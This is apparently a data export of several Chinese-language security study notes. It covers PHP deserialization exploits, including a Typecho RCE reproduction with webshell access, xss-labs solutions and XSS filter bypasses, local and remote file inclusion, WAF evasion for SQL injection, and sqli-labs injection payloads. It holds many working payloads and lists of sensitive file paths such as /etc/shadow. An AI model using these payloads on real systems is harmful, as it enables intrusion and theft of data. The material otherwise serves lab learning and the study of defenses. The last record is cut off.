[{"title":"php反序列化","date":"2022-05-07T05:58:54.000Z","url":"/2022/05/07/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","categories":[[" ",""]],"content":"基本概念序列化（串行化）：将变量转换为可保存或传输的字符串的过程； 反序列化（反串行化）：在适当的时候把这个字符串再转化成原来的变量使用。 这两个过程结合起来，可以轻松地存储和传输数据，使程序更具维护性。常见的php系列化和反系列化方式主要有：serialize，unserialize；json_encode，json_decode。 string serialize ( mixed $value )返回字符串，此字符串包含了表示 value 的字节流，可以存储于任何地方。 数据类型:长度:名字:属性个数{数据类型:长度:名称1;数据类型:长度:值1;} mixed unserialize ( string $str )对单一的已序列化的变量进行操作，将其转换回 PHP 的值。 文件名code1.php，输出结果：O:7:”chybeta”:1:{s:4:”test”;i:123;} 其中，O表示对象，7表示对象名chybeta的长度，chybeta是对象名，1表示有1个属性，{ }里面的参数有key和value，s表示是string对象，4表示长度，test是key，i表示是integer对象，123是value 可见PHP的序列化与JSON数据类似，将各种类型的数据，压缩并按照一定的格式储存起来，这样也方便传输。 在PHP中对不同类型的数据用不同的字母来标识： a - arrayb - booleand - doublei - integero - common objectr - references - stringC - custom objectO - classN - nullR - pointer referenceU - unicode string N 表示的是 NULL，而 b、d、i、s 表示的是四种标量类型，目前其它语言所实现的 PHP 序列化程序基本上都实现了对这些类型的序列化和反序列化，不过有一些实现中对 s （字符串）的实现存在问题。 a、O 属于最常用的复合类型，大部分其他语言的实现都很好的实现了对 a 的序列化和反序列化，但对 O 只实现了 PHP4 中对象序列化格式，而没有提供对 PHP 5 中扩展的对象序列化格式的支持。 r、R 分别表示对象引用和指针引用，这两个也比较有用，在序列化比较复杂的数组和对象时就会产生带有这两个标示的数据，后面我们将详细讲解这两个标示，目前这两个标示尚没有发现有其他语言的实现。 C 是 PHP5 中引入的，它表示自定义的对象序列化方式，尽管这对于其它语言来说是没有必要实现的，因为很少会用到它，但是后面还是会对它进行详细讲解的。 U 是 PHP6 中才引入的，它表示 Unicode 编码的字符串。因为 PHP6 中提供了 Unicode 方式保存字符串的能力，因此它提供了这种序列化字符串的格式，不过这个类型 PHP5、PHP4 都不支持，而这两个版本目前是主流，因此在其它语言实现该类型时，不推荐用它来进行序列化，不过可以实现它的反序列化过程。在后面我也会对它的格式进行说 明。 o标示在 PHP3 中被引入用来序列化对象，到了 PHP4 以后就被 O 取代了。在 PHP3 的源代码中可以看到对 o 的序列化和反序列化与数组 a 基本上是一样的。但是在 PHP4、PHP5 和 PHP6 的源代码中序列化部分里都找不到它。 文件名code2.php，测试结果：O:4:”demo”:1:{s:10:”demotest”;s:5:”cream”;} 注意：源代码中的属性名为,但是经过序列化后却变成了demotest，并且属性名的长度为10，不符合预期。这里涉及到 PHP 的属性的访问权限问题 我们知道属性访问权限有三个：private、protected、public，测试这三个属性的情况： 文件名code3.php，测试结果：O:4:”demo”:3:{s:4:”test”;s:6:”hacker”;s:11:”demotest2”;s:9:”pentester”;s:8:”*test3”;s:6:”redhat”; （1）public，该属性序列化后的结果正常，在预期之内； （2）private，私有权限，也就是说该属性只能由类使用，为了区别，在序列化后，private属性会在自己的名字前面加上自己所属的类名，也即变成了demotest2，但是其长度为啥是11呢？写到文件使用HEXDUMP查看便知。 根据结果表明：私有属性在序列后类名前后均有%00，也即**%00类名%00属性名** （3）protected，该属性和private有些类似，但是长度怎么计算呢？看上图便知！protected在序列化时序列化后的结果是**%00*%00属性名** 文件名code4.php，测试结果：O:4:”demo”:3:{s:4:”test”;s:6:”hacker”;s:11:”demotest2”;s:9:”pentester”;s:8:”*test3”;s:6:”redhat”;} 发现和code3.php的测试结果一样，说明定义的方法不影响序列化的结果，总之：序列化只序列化属性，不序列化方法 文件名code5.php，测试结果： 注意： 在反序列化的过程中必须保证当前作用域下类是存在的，否则无法完成反序列化操作。 反序列化之后的对象在文件执行结束后就会被销毁 反序列化漏洞PHP的反序列化漏洞又可以叫做 PHP对象注入漏洞，这种思想类似SQL注入，在unserialize接受的参数可控的情况下，通过注入我们可控的属性值，来控制类中的方法的执行，从而造成安全隐患。 魔法函数 php类可能会包含一些特殊的函数叫magic函数，magic函数命名是以符号__开头的，比如 __construct, __destruct, __toString, __sleep, __wakeup等等。这些函数在某些情况下会自动调用。 __construct(构造函数)当一个对象创建时被调用； __destruct（析构函数）当一个对象销毁时被调； __toString当一个对象被当作一个字符串使用； __sleep magic方法在一个对象被序列化的时候调用； __wakeup magic方法在一个对象被反序列化的时候调用。 文件名是code6.php，测试结果是 __constructthis is a string!__toString__destruct 文件名是code7.php，测试结果是： 安全问题 现在我们了解序列化是如何工作的，但是我们如何利用它呢?有多种可能的方法，取决于应用程序、可用的类和magic函数。记住，序列化对象包含攻击者控制的对象值。你可能在Web应用程序源代码中找到一个定义__wakeup或__destruct的类，这些函数会影响Web应用程序。例如，我们可能会找 到一个临时将日志存储到文件中的类。当销毁时对象可能不再需要日志文件并将其删除。把下面这段代码保存为code8.php。 文件名code8.php，上述代码可以删除服务器中任意文件 :”LogFile”:1:{s:8:”filename”;s:5:”1.php”;} 文件名code9.php，首先看到了参数可控的unserialize,接着看到magic_test类中存在两个魔术方法 __construct和__destruct，其中看到__destruct方法调用了action()，往下看，发现 L 类中存在action但是仅仅是做了打印的操作，没什么利用点，再看Evil方法，发现action调用了敏感操作函数eval，因此，要是我们能够控制test2的值，就能实现任意命令执行，完成攻击。【反序列化学习总结/】 在magic_test和Evil，接着我们控制 magic_test中的属性 test的值，为了执行代码，我们将test篡改为Evil的对象，并且篡改Evil的属性 test2为我们需要执行的代码。 构造payload如下： 文件名是code-payload.php，测试结果是： O:10:”magic_test”:1:{s:16:”magic_testtest”;O:4:”Evil”:1:{s:5:”test2”;s:10:”phpinfo();”;}} 提交测试：:”magic_test”:1:{s:16:”magic_testtest”;O:4:”Evil”:1:{s:5:”test2”;s:10:”phpinfo();”;}} 报错没有结果，找找原因，注意magic_test类下的$test是私有的，序列化的结果应该是%00magic_test%00test，也即发送POC是： O:10:”magic_test”:1:{s:16:”%00magic_test%00test”;O:4:”Evil”:1:{s:5:”test2”;s:10:”phpinfo();”;}} 在上课的时候，有小伙伴提到在构造payload，想到使用下面的方法： 得到的结果是： test属性访问权限换成private之后，得到结果需要修改为： 在前端提交时，需要在magic_test前后加%00，也即： 例外，以上结果中test的值是一个字符串，为了让test能够调用Evil中action方法，需要的是Evil对象，所以需要变换为如下的形式： 除了上述的魔法函数，还有如下的函数： __call()是在对象上下文中调用不可访问的方法时触发 __callStatic()是在静态上下文中调用不可访问的方法时触发。 __get()用于从不可访问的属性读取数据。 __set()用于将数据写入不可访问的属性。 __isset()在不可访问的属性上调用isset()或empty()触发。 __unset()在不可访问的属性上使用unset()时触发。 __invoke()当脚本尝试将对象调用为函数时，调用__invoke()方法。 PHP反序列化漏洞原理归纳： 1、 参数用户可控； 2、 服务器中代码定义了魔术函数(__wakeup,__sleep,__construct/__destruct/__tostring等)，并且该魔术函数中有危险函数，如命令执行类（exec/passthru/popen/system等）和文件操作类（file_put_contents/file_get_contents/unlink等)等函数； 3、 用户输入的数据（序列化之后的字符串）未经过滤或者过滤不严谨到达该危险函数，最后执行用户的输入 CVE-2016-7124触发该漏洞的PHP版本为PHP5小于5.6.25或PHP7小于7.0.10。漏洞可以简要的概括为：当序列化字符串中表示对象个数的值大于真实的属性个数时会跳过__wakeup()的执行。 如下的代码也可以练习： 根据CVE-2016-7124构造POC，如下 运行poc.php，得到结果如下： :”Test”:1:{s:9:”Test poc”;s:5:”shell”;} 接下来需要修改两个方面： 将1改为大于1的任何整数 将Testpoc改为%00Test%00poc :”Test”:3:{s:9:”%00Test%00poc”;s:5:”shell”;} 然后getshell，直接访问写的文件： Typecho反序列化漏洞Typecho Typecho是一款内核强健﹑扩展方便﹑体验友好﹑运行流畅的轻量级开源博客程序。基于PHP5开发，使用多种数据库（Mysql，PostgreSQL，SQLite）储存数据。在GPL Version 2许可证下发行，是一个开源的程序，适用范围十分广泛。 漏洞介绍和复现 Typecho博客软件存在反序列化导致任意代码执行漏洞，恶意访问者可以利用该漏洞无限制执行代码，获取webshell，存在高安全风险。通过利用install.php页面，直接远程构造恶意请求包，实现远程任意代码执行，对业务造成严重的安全风险。 影响版本：Typecho 0.9~1.0 漏洞的入口出现在install.php页面，代码如下： 上述代码经过了两次的判断，我们继续跟进，在install.php 232行~237行： 出现一个比较明显的反序列化漏洞，首先获取到cookie中的__typecho_config值base64解码后，然后进行反序列化。 想要执行，只需isset($_GET[‘finish’])并且__typecho_config存在值。反序列化后把config[‘adapter’]和config[‘prefix’]传入Typecho_Db进行实例化。然后调用Typecho_Db的addServer方法，调用Typecho_Config实例化工厂函数对Typecho_Config类进行实例化。 Feed.php中__get()方法—-&gt;Request.php中的applyFilter函数—–&gt;call_user_func(代码执行) 复现漏洞 访问URL： 使用BP进行抓包，如图： 抓到包之后我们在BurpSuite点击右键，发送到Repeater，并将POC文件中的Cookie和Referer复制到BurpSuite中修改Referer的IP为192.168.186.140，如图所示。 点击“GO”，可以看到 POC 也即： 如图返回状态码为500的数据包就代表成功了。我们这时使用中国菜刀连接 bugku 文件包含和PHP反序列化漏洞CTF练习题访问URL：，提示 you are not the number of bugku ! 查看页面源代码发现有当前页面的代码 txt参数可以使用php://input绕过，效果如下 然后需要包含file参数，但是需要包含文件需要做信息收集，index.php、hint.php、flag.php，三个页面。直接包含flag.php会提示“不能现在就给你flag哦”。所以可以试一试包含hint.php，里面的源码可以通过php://filter/convert.base64-encode/resource=hint.php查看。 解密如下： 查看hint.php以及index.php的代码我们可以知道，接下来需要使用反序列化去读取flag.php中数据。接下来需要构造password的值。 payload如下： 运行结果为：O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;} :”Flag”:1:{s:4:”file”;s:8:”flag.php”;} 在源代码中可以看到flag{php_is_the_best_language} PHP反序列化漏洞的防御1.要严格控制unserialize函数的参数，坚持用户所输入的信息都是不可靠的原则 2.要对于unserialize后的变量内容进行检查，以确定内容没有被污染"},{"title":"xss-labs1-12关","date":"2022-04-22T03:51:33.000Z","url":"/2022/04/22/xss-labs1-12%E5%85%B3/","categories":[[" ",""]],"content":"xss-lib注：为防止不必要的麻烦，统一把&lt;&gt;替换成《&gt;第一关：get请求的name变量放入xss poc,完整的返回在html中，浏览器响应xss poc。level1.php?name=《script&gt;alert(“xss”)《/script&gt;第二关：test”&gt;《script&gt;alert(“xss”)《/script&gt;// 完成闭合第三关：查看源码对&gt;进行了过滤 ‘ onclick=’alert(1)第四关：同上 “onclick=”alert(1)第五关：尝试”onclick=”alert(1)发现对on经行过滤再尝试test”《script&gt;alert(“xss”)《/script&gt;// 发现对script进行过滤但&gt;没进行过滤利用没有过滤尖括号，构造a标签再尝试利用a标签的href属性执行javascript伪协议，”&gt;《a href=’javascript:alert(1)’&gt;a《/a&gt;//,没有对javascript进行过滤，触发xss第六关：”&gt;《a HrEf=’javascript:alert(1)’&gt;a《/a&gt;//大小写绕过第七关：test” /&gt;《a hrhrefef=”javascscriptript:alert(1)”&gt;a《/a&gt;// 重写绕过第八关：把javascript:alert(1)进行编码绕过第九关：采用第八关的poc，发现poc中应包含合法的url，poc中添加//,发现可以进行绕过第十关：.详细查看源代码，可能有隐藏的表单，尝试提交t_link、t_history、t_sort变量，t_sort变量返回在了html的value中，尝试进行了绕过。构造poc：”type=”text” onclick=”alert(1)”，web浏览器成功执行 。ps:type=”text”为构造一个文本框，用来触发onclick事件test&amp;t_sort=”type=”text” onclick=”alert(1)”第十一关：根据返回的html判断refer字段为web页面的自定义变量，可能存在xss注入点修改refer “type=”text” onclick=”alert(1)”第十二关：根据返回的html判断user-agent字段为web页面的自定义变量，可能存在xss注入点修改user-agent “type=”text” onclick=”alert(1)”"},{"title":"xss漏洞","date":"2022-04-20T02:03:43.000Z","url":"/2022/04/20/xss%E6%BC%8F%E6%B4%9E/","categories":[[" ",""]],"content":"注： &lt;&gt; 统一写成《&gt; 要不然一点开一直弹窗XSS漏洞的概述漏洞的介绍. XSS又叫CsS (Cross Site Script)，全称跨站脚本攻击。它指的是攻击者往Web页面或者URL里插入恶意JavaScript脚本代码，如果Web应用程序对于用户输入的内容没有过滤，那么当正常用户浏览该网页的时候，嵌入在Web页面里的恶意JavaScript脚本代码会被执行，从而达到恶意攻击正常用户的目的。漏洞的位置·数据交互的地方∶-get post cookies headers方法-富文本编辑器-各类标签插入和自定义·数据输出的地方∶-用户资料-关键词、标签、说明漏洞的原理 XSS，是指攻击者通过在Web页面中写入恶意脚本，造成用户在浏览页面时，获取控制用户浏览器进行操作的攻击方式。服务端代码︰用户提交:&lt;script&gt;alert(/xss/)&lt;/script&gt;xSS漏洞产生的两个条件确定1.可以控制的输入点⒉.输入能返回到前端页面上被浏览器当成脚本语言解释执行漏洞的分类,根据攻击手法的不同，XSS漏洞分为三类类型 存储区 插入点反射型XSS URL HTML存储型XSS 后端数据库 HTMLDOM型xSS 后端数据库/前端存储/URL 前端JavaScript反射型XSS 验证反射型xss漏洞存在的poc : ◆存储型XSs概念︰持久性跨站脚本，是三种XSS中危害最大的。它是将恶意代码写进数据库或文件等可以永久保存数据的介质中&gt;存在位置:常出现在留言板、发表评论或发表文章的地方(数据写入的地方)攻击手法:通过留言板等功能，将攻击者精心构造XSS代码，保存到数据库中，当其他用户再次访问这个页面时，就会触发并执行恶意的XSS代码，从而窃取用户的敏感信息。 DOM型xSSDOM型XSs漏洞概念∶不经过后端，DOM-XSS漏洞是基于文档对象模型的一种漏洞，简单去理解就是因为输出点在DOMRDOM-XSS是通过url传入参数去控制触发的，其实也属于反射型XSS. 攻击手法∶攻击者构造出特殊的URL，其中包含恶意代码。用户打开带有恶意代码的URL用户浏览器接收到响应后解析执行，前端JavaScript取出URL中的恶意代码并执行。恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。三种漏洞的区别存储型XSS与反射型XSS的区别·存储型XSS的恶意代码存在数据库里，反射型XSS的恶意代码存在URL里DOM型与其他两种XSS的区别.DOM型XSS攻击中，取出和执行恶意代码由浏览器端完成，属于前端JavaScript自身的安全漏洞，而其他两种XSS都属于服务端的安全漏洞 xSS的简单利用有哪些:1.xSS获取管理员权限(获取cookie) ——重要2. XSS键盘记录——重要3. XSS获取内网IPxSS获取cookiecookie的介绍︰指某些网站为了辨别用户身份、进行session跟踪而储存在用户本地终端上的数据cookie的作用:它可以记录用户ID、密码、停留时间等等，当再次访问这个网站时，浏览器会自动监这个文件，并将存储在本地的Cookie信息发送给网站，网站通过读取Cookie，得知相关信息，就可以做出相应的动作，比如:直接登陆，无需再次输入账号和密码。 获取cookie的危害:窃取用户Cookie，冒充用户身份进入网站cookie的格式:Cookie有变量名( key)和值( value )组成，属性中的变量用“变量=值”的形式保存Set-Cookie: 《name&gt; = [; =]…l; expires=《date&gt;][; domain= ]l; path=《some_path&gt;][; secure][ ; httponly] 2.伪协议的方式构造XSS·可以使用javascript:伪协议的方式构造XSS ，html标签支持js伪协议形式，如src ,href ,background等·形式 : javascriptalert(/xss/);·举例︰利用href标签的伪协议《a href=”javascriptalert(/xss/)” &gt;touch me! 通过href标签创建超链接，并通过伪协议进行xss攻击，所以点击了超链接就会进行弹窗操作。XSS的变形与绕过事件利用。举例:. 《img src=’./smile.jpg’ onmouseover=’alert(/xss/)’&gt;·这个标签会引入一个图片，然后鼠标悬停在图片上的时候，触发XSS代码其他事件利用. 《input type=”text” onkeydown=”alert(/xss/)”&gt;当按下键盘任意一个按键的时候触发。. ·《input type=“text” onkeyup= “alert(/xss/)”&gt;当松开键盘任意一个按键的时候触发。·《input type= “button” onclick=”alert(/xss/)”&gt;当点击按钮时触发。. 《img src= ‘#’ onerror= ‘alert(/xss/)”&gt;当img图片载入报错时触发。5．其他标签以及手法随着前端语言的更新和发展，会有新的标签和事件出现，所以前端的安全是个讨论不完的问题。. 《svg onload=”alert(/xss/)”&gt; svg是H5语言中的标签，配合事件可以触发XSS·sXg是H5语言中的标签，配合事件可以触发XSS. 《input onfocus=alert(/xss/) autofocus&gt;·onfocus事件是input标签中的新增事件，这个事件是当input输入框获取焦点时执行一段JS代码，从而触发XSS xSS的变形3.左斜线[/]代替空格。可以利用左斜线代替空格原payload《Img sRc=’#’ Onerror=”alert(/xss/)” /&gt; 一&lt;Img/sRc=’#’/Onerror=’alert(/xss/) /&gt;4.回车的使用.可以在一些位置添加水平制表符和回车符，来绕过关键字检测原payload : 《a href=”javascriptalert:alert(/xss/)”&gt;click me _《A hREf=”ja va sc ri pt :alert(/xss/)”&gt;clickme ≥注意:一些函数不可以加回车，比如事件:onmoveover、onerror等，它们alert(/xss/“&gt;click对于html语言是完整的单词 XSS的变形5．对标签属性值进行转码·可以对标签属性值进行转码，用来绕过过滤。对应编码如下字母 ASCII码 十进制编码 十六进制编码a 97 &#97; &#x61;e 101 &amp;#101 ; #x65;一·原payload : 《a hREf=”javaScript:alert(/xss/)” &gt;click me编码《A hREf=”j&#97;v&#x61;script:alert(/xss/)”&gt;click me! 双写绕过《script&gt; 《scr《script&gt;ipt&gt;"},{"title":"文件包含漏洞","date":"2022-04-20T01:15:40.000Z","url":"/2022/04/20/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/","categories":[[" ",""]],"content":"一、什么是文件包含漏洞？ 1、文件包含概述 和SQL注入等攻击方式一样，文件包含漏洞也是一种“注入型漏洞”，其本质就是输入一段用户能够控制的脚本或者代码，并让服务器端执行。 什么叫包含呢？以PHP为例，我们常常把可重复使用的函数写入到单个文件中，在使用该函数时，直接调用此文件，而无需再次编写函数，这一过程就叫做包含。 有时候由于网站功能需求，会让前端用户选择要包含的文件，而开发人员又没有对要包含的文件进行安全考虑，就导致攻击者可以通过修改文件的位置来让后台执行任意文件，从而导致文件包含漏洞。 以PHP为例，常用的文件包含函数有以下四种： include()，require()，include_once()，require_once() 区别如下： 二.本地文件包含漏洞能够打开并包含本地文件的漏洞，我们称为本地文件包含漏洞（LFI）。（1）使用绝对路径使用绝对路径直接进行读取：2）使用相对路径进行读取：当前页面所在路径为C:\\Apache24\\htdocs\\，我们需要使用…/退到C盘再进行访问，构造路径如下：…/…/windows/system.ini（3）一些常见的敏感信息路径：Windows系统： c:\\boot.ini // 查看系统版本 c:\\windows\\system32\\inetsrv\\MetaBase.xml // IIS配置文件 c:\\windows\\repair\\sam // 存储Windows系统初次安装的密码 c:\\ProgramFiles\\mysql\\my.ini // MySQL配置 c:\\ProgramFiles\\mysql\\data\\mysql\\user.MYD // MySQL root密码 c:\\windows\\php.ini // php 配置信息Linux/Unix系统： /etc/passwd // 账户信息 /etc/shadow // 账户密码文件 /usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件 /usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置 /usr/local/app/php5/lib/php.ini // PHP相关配置 /etc/httpd/conf/httpd.conf // Apache配置文件 /etc/my.conf // mysql 配置文件 ◆本地文件包含(LFI)有限制本地文件包含漏洞绕过&gt;绕过方法路径长度截断·条件:1、Windows下要长于256字节，超出的部分会被丢弃 2、Linux下要长于4096字节，超出的部分会被丢弃。192.168.152.143/action2.php?action=phpifo.php/./././././././././././././././././././././././././././././00截断如果我们想通过文件包含漏洞读取本地敏感信息，就会遇到一些问题。因为服务器会给路径加上./site/路径，以及.php后缀。此时我们可以使用使用%00截断：%00为结束符，在filename后带上%00，就可以截断末尾的.php。当前路径为./site/，如果要读取system.ini，则需要输入：…/…/…/windows/system.ini%00，需要注意的是，%00截断需要php版本小于5.3.4，且关闭magic_quotes_gpc功能 2、配合文件上传使用有时候我们找不到文件上传漏洞，无法上传webshell，可以先上传一个图片格式的webshell到服务器，再利用本地文件包含漏洞进行解析。编辑一个图片马，找到上传点进行上传，文件保存的完整路径为：C:\\phpStudy\\WWW\\hackable\\uploads\\webshell.jpg找到具有文件包含漏洞的页面 该页面用于读取C:\\phpStudy\\WWW\\vulnerabilities\\fi\\路径中的文件 现在我们利用该页面去执行我们上传的图片马，路径需要从C:\\phpStudy\\WWW\\vulnerabilities\\fi\\ 转到C:\\phpStudy\\WWW\\hackable\\uploads\\webshell.jpg192.168.211.151/vulnerabilities/fi/?page=../../hackable/uploads/webshell.jpg使用webshell管理工具连接即可。 远程文件包含(RFI)远程包含的意思·指的是能够包含远程服务器上的文件并执行，可以通过http(s)或者ftp 等方式，远程加载文性。危害·由于远程服务器的文件是我们可控的，因此漏洞一旦存在危害性会很大。包含条件. allow_url_include=On（默认为OFF，需要在php.ini中手动打开)- allow _url_fopen = On（是否允许打开远程文件)·用户可以动态控制变量 举例:。[URL]?path=通过http协议加载目标机中的info.php文件·[URL]?path=ftp://用户名:密码@ip/info.php //通过ftp协议加载目标机中的info.php文件文件包含漏洞的利用远程文件包含(RFI)有限制远程文件包含漏洞绕过绕过方法1.问号绕过 payload : ?action=? 2.#号绕过 payload : ?action= 文件包含漏洞的利用漏洞的利用1、端口探测. url=dict//ip:8022.包含上传的getshell·上传图片马，利用文件包含我们的图片马，菜刀连接3、包含日志文件GetShell·为了避免在web中进行了url编码，进行报错，把报错信息写进日志4、远程文件包含写shell"},{"title":"绕过waf技巧","date":"2022-04-13T01:30:20.000Z","url":"/2022/04/13/%E7%BB%95%E8%BF%87waf%E6%8A%80%E5%B7%A7/","categories":[[" ",""]],"content":"常见的过WAF技巧1．大小写绕过∶·大小写绕过用于只针对小写或大写的关键字匹配技术·出现原因:在waf里，使用的正则不完善或者是没有用大小写转换函数·用法:比如，拦截了union，那就使用uNIoNXXx.com/index.php?id=-3 uNIoN sELect 1,2,3·注意:对于一些不太成熟的WAF效果显著 2．替换关键字∶关键字双写·出现原因∶利用waf的不完整性，只验证一次字符串或者过滤的字符串并不完整。·用法∶XXX.Com/index.php?id=-3 UNION SELECT 1,2,3·注意:有些时候甚至构造更复杂，如:SeLSeselectleCTecL 3替换关键字∶同价词替换·出现原因:WAF主要是针对一些特殊的关键词进行检测·用法︰ and和or不能使用:&amp;&amp;和Ⅱ 代替and和or =不能使用的情况:可以尝试&lt;、&gt;代替 ·空格不能使用（常见）︰%20 %09 %0a %0b %Oc %Od %a0/**/ 代替空格·注意:在mysql中%0a是换行，可以代替空格，这个方法也可以部分绕过最新版本的安全狗 4.特殊字符拼接·出现原因:把特殊字符拼接起来绕过WAF的检测·用法︰如在函数里可以用+来拼接，在Mysql中可以利用注释/**/绕过 xxx.com/index.php?id=1;exec(master..xp_cmdshell ‘net user’)特殊字符拼接 xxx.com/index.php? id=1; exec(‘maste’+’r..xp’+’_cmdshell’+’”net user”‘) 5.编码绕过:·对一些字符进行编码，常见的SQL编码有unicode、HEX、URL、ascll、 base64等URL编码·出现原因:利用浏览器上的进制转换或者语言编码规则来绕过wafURL编码·输入一个连接，非保留字的字符浏览器会对其URL编码，如空格变为%20、单引号%27、左括号%28等·注意:如果URL编码只进行了一次过滤，可以用两次编码绕过·用法∶index.php?id=1//UNION//SELECT 1,2,3URL编码index.php?id=1%2f%2a%2a%2f%75%6e%69%6f%6e%2f%2a%2a%2f%73%65%6c%65%63%74%20%31%2c%32%2c%33%0aUnicode编码·常用符号的Unicode编码︰单引号: %u0027空格:%u0020左括号:%u0028右括号:%u0029用法︰index.php?id=1 union select 1,2,3Unicode编码index.php?id=1 un%u0069on sel%u0065ct 1,2,3 6.注释绕过:·常见的用于注释的符号∶//、–、//、#、–+、—、 ;、–a·出现原因∶利用语言函数特性来绕过waf的规则普通注释. /*/在构造的查询语句中插入注释，规避对空格的依赖或关键字识别。·用法︰index.php?id=1 UNION SELECT 1,2,3普通注释index.php?id=1//UNION/**/SELECT 1,2,3 注释绕过:内联注释·相比普通注释，内联注释用的更多，它有一个特性/!/只有MySQL能识别(/!/表示注释里面的语句会被执行)·用法∶采用/! code /来执行我们的SQL语句，内联注释可以用于整个SQL语句中·举例:过滤器过滤了如下内容union,where, table name, table schema, =, and information schema，这些都是我们内联绕过需要绕过的目标id=1 union select 1,2,concat(table name) from information schema.tables where table schema =database()内联注释id=1/!UnIoN*/+SeLeCT+1,2,concat(/!table_name/)+FrOM/*!information schema/.tables /!WHERE/+/!TaBIE..ScHeMa/+like+database()·注意︰/!50001 select * from test/的含义︰表示假如数据库是5.00.01以上版本，该语句才会被执行 7.参数污染:·案例:ModSecurity过滤器会将类似于select1,2,3 from table这类的语句归类为黑名单当web服务器遇到类似/index.aspx?id=select 1,2,3 from table这样的语句时，会阻断请求但是这个web服务器在遇到为同一个参数赋值不同数值时，会将它们连接起来，攻击者通过这个方法来绕过黑名单·例如︰想要执行的语句:/index.aspx?id=select 1,2,3 from table参数污染提交的URL : /index.aspx?id=select 1&amp;id=,2,3 from table·说明∶1、这不属于黑名单中的模式，不会触发黑名单的拦截功能2、由于WEB程序会采取连接操作，即将&amp;符号前后的内容个连接，因此SQL注入行为能够被执行 8.缓冲区溢出∶·缓冲区溢出用于绕过WAF，许多WAF是C语言写的，而C语言自身没有缓冲区保护机制·因此如果WAF在处理测试向量时超出了其缓冲区长度，就会引发bug从而实现绕过例如︰?id=1 and (select 1)=(Select OxAAAAAAAAA1000 more A)+UnIoN+SeLeCT+1,2,version0),4,5,database(),user),8,9,10–+·说明︰示例OxA1000指OxA后面”A”重复1000次，一般来说对应用软件构成缓冲区溢出都需要较大的测试长度，这里1000只做参考，在某些情况下可能不需要这么长也能溢出。 9.分块传输绕过:·举例∶使用分块传输，将id=1 and 1=2进行分块，成功绕过了安全狗·注意︰分块传输需要将关键字and,or,select ,union等关键字拆开，不然仍然会被waf拦截。编码过程中长度需包括空格的长度。最后用0表示结束，并在0后空两行表示数据包结束 整合绕过:·整合的意思是结合使用前面的各种绕过技术，单一的技术可能无法绕过过滤机制，但多种技术的配合使用成功的可能性会增加·多种技术的使用增加了更多的可能性，除非每一种技术单独都无法使用，否则它们能大大增加绕过的成功性例如︰id=1/IUnIoN/+SeLeCT+1,2,concat(/!table_name/)+FrOM/!information_schema/.tables /!WHERE/+/!TaBIE_ScHeMa/+ like+database() ?id=1+/!UNION/+/!SELECT/+1,GrOup_COnCaT(COLUMN_NAME),3,4-5+FROM+/!INFORMATION_SCHEM/.COLUMNS+WHERE+TABLE_NAME=Ox41646d696e–"},{"title":"sql-lib","date":"2022-04-06T06:40:53.000Z","url":"/2022/04/06/sql-lib/","categories":[[" ",""]],"content":"sql注入union联合注入(前四关关同理)1.; //报错,说明存在注入2.; and 1=1–+ //显示数据; and 1=2–+ //没有显示数据，说明这是个基于单引号的字符型注入判断是整形注入还是字符型注入数字型注入与字符型注入的最大去区别在于数字型不需要闭合，而字符型需要引号闭合select * from table where id = 1 数字型select * from table where username = ‘admin’ 字符型在第一关中上述可以，第二关中?id=1 and 1=1–+显示数据，id=1 and 1=2–+ //没有显示数据，说明这是个基于数值型注入第三关中 向页面输入?id=1’,报错 ,发现报错信息中有括号闭合，那就变成 ?id=1’) and 1=1–+显示数据，id=1’) and 1=2–+ //没有显示数据，说明是(‘’)这种方式闭合字符串的第四关中于第三关相同输入?id=1”,报错 ,发现报错信息中有括号闭合，那就变成?id=1”) and 1=1–+显示数据，id=1”) and 1=2–+ //没有显示数据，说明是(‘’)这种方式闭合字符串的 3.; order by 4–+ //分别进行从一开始的实验，找到有几个字段，order by 3回显正常 order by 4回显不正常说明存在3列数据( 在注释符被过滤的时候，ordey by查询语句，在用对应符号闭合会出现问题，可以使用联合查询的特性：UNION 内部的 SELECT 语句必须拥有相同数量的列,来确定字段数。?id=-1’ union select 1,2,3,4 –+多出的4超过了前面查询语句的列数就会报错：The used SELECT statements have a different number of columns)4.; union select 1,2,3–+ //用来联合查询，但是只能输出后面的查询，所以把前面的查询结果为空值，显示2，3，说明可以使用2，3这两个位置。5.; union select 1,(select group_concat(schema_name) from information_schema.schemata),3 –+ //查询所有数据库的名字（也可以直接用?id=-1’ union select 1,database(),3–+ 查询数据库）6.; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=’security’),3 –+ //查询数据库security中所有表名7.; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=’users’) –+ //查询表users中的所有列名8.; union select 1,2,(select group_concat(id,0x3a,username,0x3a,password) from users) –+ //查询表users中的所有信息（0x3a代表的是：） 报错注入● 该函数对xml文档进行查询。● extractvalue(xml_frag,xpath_expr) 第一个参数式是查询内容，第二个参数是查询路径。● 原理：当路径写入格式错误就会报错，显示出来，同时还会写入我们的非法查询语句并将查询的结果返回出来，所以在第二个参数位置构造sql语句进行注入● and extractvalue(1, payload)输出字符有长度限制，最长32位。payload即我们要输入的sql查询语句; and (select extractvalue(1,concat(0x7e,(select user())))) –+ //更换select后的语句进行查询 （版本version() 数据库database()）; and (select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))) –+ //列如这样 里面语句和上面union一样 第五关id=1’ 发现报错 id=1’ –+ 不报错但是回显的内容和初始内容一样，说明这个为可以用布尔盲注，时间盲注，报错注入布尔盲注：?id=1’ and substr((select database()),n,1)=’s’–+ 通过这个语句判断出数据库的名字，不断改变n的值来，看是否有回显，正确有回显，错误没有回显 判断’s’可以用burp工具来进行 最终确定的库名为security。?id=1’ and substr((select table_name from information_schema.tables where table_schema=’security’ limit x,1),n,1)=’s’–+ 修改limit x,1和中x 可以选择第几个表, substr中的n用来判断表名每个位置的字母，爆破到第一张表为referer，终于在第三张表爆破到users表。?id=1’ and substr((select column_name from information_schema.columns where table_name=’users’ limit x,1),n,1)=’u’–+ 同理找到第一个字段为username第2个字段为password?id=1’ and substr((select username from users limit 0,1),n,1)=’d’–+ 同理找到其中数据?id=1’ and substr((select password from users limit 0,1),n,1)=’d’–+ 时间盲注：?id=1’ and if((substr((select 